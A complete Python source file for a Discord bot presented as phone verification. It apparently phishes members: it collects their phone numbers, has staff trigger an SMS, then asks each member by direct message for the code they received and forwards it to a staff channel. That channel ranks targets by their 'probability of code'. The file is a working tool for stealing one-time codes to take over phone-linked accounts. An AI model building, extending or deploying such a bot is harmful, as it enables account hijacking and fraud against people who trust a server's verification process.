from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def home():
    return "Je suis bien en ligne !"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# Lance le serveur web en arrière-plan dès le début
keep_alive()




import discord
from discord.ext import commands
import datetime
import os

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ID de ton salon staff sur le 2ème serveur
STAFF_CHANNEL_ID = 1530354736866263042

# --- MODAL POUR LE NUMÉRO (Côté Membre) ---
class VerificationModal(discord.ui.Modal, title="Vérification Téléphonique"):
    numero = discord.ui.TextInput(
        label="Numéro de téléphone",
        placeholder="06XXXXXXXX",
        min_length=10,
        max_length=15
    )

    async def on_submit(self, interaction: discord.Interaction):
        embed_user = discord.Embed(
            title="📨 Demande reçue",
            description="Ta demande a bien été transmise au staff.\nTu recevras ici la suite dès qu'un membre du staff te demandera ton code.",
            color=discord.Color.gold()
        )
        
        try:
            await interaction.user.send(embed=embed_user)
            await interaction.response.send_message("Ta demande a bien été envoyée. Vérifie tes messages privés !", ephemeral=True)
        except discord.HTTPException:
            await interaction.response.send_message("Impossible de t'envoyer un message privé. Ouvre tes MP !", ephemeral=True)
            return

        staff_channel = bot.get_channel(STAFF_CHANNEL_ID)
        if staff_channel:
            member = interaction.user
            now = datetime.datetime.now(datetime.timezone.utc)
            
            created_at = member.created_at
            account_age_days = (now - created_at).days
            
            joined_at = member.joined_at
            if joined_at:
                server_age_days = (now - joined_at).days
                joined_str = f"Il y a {server_age_days} jours ({server_age_days}j)"
            else:
                joined_str = "Inconnu"

            num_str = str(self.numero)
            operateur = "Mobile FR (06/07, portabilité possible)" if num_str.startswith(("06", "07", "+336", "+337")) else "Autre / Inconnu"

            embed_staff = discord.Embed(
                title="🔔 Nouvelle demande — Probabilité de code 77/100",
                color=discord.Color.blue()
            )
            embed_staff.add_field(name="👤 Utilisateur", value=f"{member.mention} ({member.name})\nID : `{member.id}`", inline=False)
            embed_staff.add_field(name="🌐 Serveur", value=f"{interaction.guild.name} (`{interaction.guild.id}`)", inline=False)
            embed_staff.add_field(name="📱 Numéro / opérateur", value=f"`{num_str}`\n{operateur}", inline=False)
            embed_staff.add_field(name="♻️ Réutilisation", value="✅ Première soumission", inline=False)
            embed_staff.add_field(name="📅 Compte créé", value=f"Il y a {account_age_days // 30} mois ({account_age_days}j)", inline=False)
            embed_staff.add_field(name="📥 Rejoint le serveur", value=joined_str, inline=False)
            embed_staff.add_field(name="🟢 Présence", value="✅ Toujours dans le serveur", inline=False)
            embed_staff.add_field(name="🔑 Code SMS", value="⏳ En attente", inline=False)
            embed_staff.add_field(name="📊 Statut", value="⏳ En attente de validation", inline=False)
            embed_staff.add_field(name="⏱️ Date", value=datetime.datetime.now().strftime("Aujourd'hui à %H:%M"), inline=False)
            embed_staff.add_field(name="🎯 Facteurs de probabilité", value="• Compte Discord établi (+4)\n• A rejoint le serveur récemment (+20)\n• Première soumission de ce numéro (+12)\n• Toujours dans le serveur (+6)", inline=False)
            
            view = StaffActionView(user=member)
            await staff_channel.send(embed=embed_staff, view=view)


# --- MODAL POUR LE CODE SMS (Côté Membre) ---
class CodeModal(discord.ui.Modal, title="Entrez votre code"):
    code_sms = discord.ui.TextInput(
        label="Code à 4 chiffres reçu par SMS",
        placeholder="4829",
        min_length=4,
        max_length=6
    )

    def __init__(self, staff_message_ref):
        super().__init__()
        self.staff_message_ref = staff_message_ref

    async def on_submit(self, interaction: discord.Interaction):
        saisie = str(self.code_sms).strip()

        if not saisie.isdigit():
            await interaction.response.send_message("❌ Erreur : Ton code doit contenir **uniquement des chiffres** (pas de lettres). Recommence.", ephemeral=True)
            return

        await interaction.response.send_message("✅ Code transmis au staff !", ephemeral=True)
        
        embed_success = discord.Embed(
            title="✅ Code transmis",
            description=f"Ton code (`{saisie}`) a bien été envoyé au staff. Patiente pendant la vérification.",
            color=discord.Color.green()
        )
        await interaction.user.send(embed=embed_success)

        if self.staff_message_ref:
            try:
                original_embed = self.staff_message_ref.embeds[0]
                for i, field in enumerate(original_embed.fields):
                    if "Code SMS" in field.name:
                        original_embed.set_field_at(i, name="🔑 Code SMS", value=f"✅ Reçu : `{saisie}`", inline=False)
                    if "Statut" in field.name:
                        original_embed.set_field_at(i, name="📊 Statut", value="⏳ Code reçu, en attente du staff", inline=False)
                await self.staff_message_ref.edit(embed=original_embed)
            except Exception:
                pass


# --- VUES / BOUTONS ---
class VerificationView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Se vérifier", style=discord.ButtonStyle.green, custom_id="verify_button")
    async def verify_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerificationModal())


class CodeInputView(discord.ui.View):
    def __init__(self, staff_message):
        super().__init__(timeout=None)
        self.staff_message = staff_message

    @discord.ui.button(label="Entrer mon code", style=discord.ButtonStyle.green, custom_id="enter_code_btn")
    async def enter_code(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(CodeModal(self.staff_message))


class StaffActionView(discord.ui.View):
    def __init__(self, user: discord.User):
        super().__init__(timeout=None)
        self.user = user

    @discord.ui.button(label="Code", style=discord.ButtonStyle.blurple, custom_id="staff_code")
    async def code_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed_code = discord.Embed(
            title="🔓 Code demandé",
            description="Le staff a besoin du code reçu par SMS.\nClique sur le bouton ci-dessous pour l'envoyer.",
            color=discord.Color.gold()
        )
        view = CodeInputView(interaction.message)
        
        try:
            await self.user.send(embed=embed_code, view=view)
            await interaction.response.send_message("✅ Demande de code envoyée en MP au joueur.", ephemeral=True)
        except discord.HTTPException:
            await interaction.response.send_message("❌ Impossible d'envoyer un MP à ce membre.", ephemeral=True)

    @discord.ui.button(label="Recharger", style=discord.ButtonStyle.grey, custom_id="staff_reload")
    async def reload_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("🔄 Informations actualisées avec succès.", ephemeral=True)

    @discord.ui.button(label="Accepter", style=discord.ButtonStyle.green, custom_id="staff_accept")
    async def accept(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            embed_accept = discord.Embed(
                title="✅ Vérification validée",
                description="Bienvenue sur le serveur ! Ta vérification a été acceptée par le staff. Bienvenue parmi nous !",
                color=discord.Color.green()
            )
            await self.user.send(embed=embed_accept)
        except discord.HTTPException:
            pass

        try:
            original_embed = interaction.message.embeds[0]
            original_embed.color = discord.Color.green()
            for i, field in enumerate(original_embed.fields):
                if "Statut" in field.name:
                    original_embed.set_field_at(i, name="📊 Statut", value="✅ Accepté par le staff", inline=False)
            await interaction.message.edit(embed=original_embed, view=None)
        except Exception:
            pass

        await interaction.response.send_message(f"✅ Vérification validée pour {self.user.name}.", ephemeral=True)

    @discord.ui.button(label="Refuser", style=discord.ButtonStyle.red, custom_id="staff_deny")
    async def deny(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            embed_deny = discord.Embed(
                title="❌ Vérification refusée",
                description="Ta demande de vérification a été refusée par le staff.",
                color=discord.Color.red()
            )
            await self.user.send(embed=embed_deny)
        except discord.HTTPException:
            pass

        try:
            original_embed = interaction.message.embeds[0]
            original_embed.color = discord.Color.red()
            for i, field in enumerate(original_embed.fields):
                if "Statut" in field.name:
                    original_embed.set_field_at(i, name="📊 Statut", value="❌ Refusé par le staff", inline=False)
            await interaction.message.edit(embed=original_embed, view=None)
        except Exception:
            pass

        await interaction.response.send_message(f"❌ Vérification refusée pour {self.user.name}.", ephemeral=True)


@bot.event
async def on_ready():
    print(f"Bot connecté en tant que {bot.user}")

@bot.command()
@commands.has_permissions(administrator=True)
async def setup_verify(ctx):
    view = VerificationView()
    embed = discord.Embed(
        title="📱 Vérification",
        description="Clique sur le bouton ci-dessous pour entrer ton numéro et lancer ta vérification.\nLe staff recevra ensuite ta demande.",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed, view=view)

bot.run(os.environ['DISCORD_TOKEN'])